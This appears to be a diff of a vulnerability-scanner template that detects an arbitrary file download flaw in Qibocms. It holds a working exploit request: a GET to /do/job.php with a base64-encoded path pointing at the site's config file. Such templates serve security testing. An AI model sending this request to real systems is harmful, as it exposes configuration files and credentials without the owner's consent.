@@ -1,15 +1,14 @@
 id: qibocms-file-download
 
 info:
-  name: Qibocms - Arbitrary File Download
+  name: Qibocms - Arbitary File Download
   author: theabhinavgaur
   severity: high
   metadata:
-    max-request: 1
     verified: true
   tags: qibocms,lfr
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8"
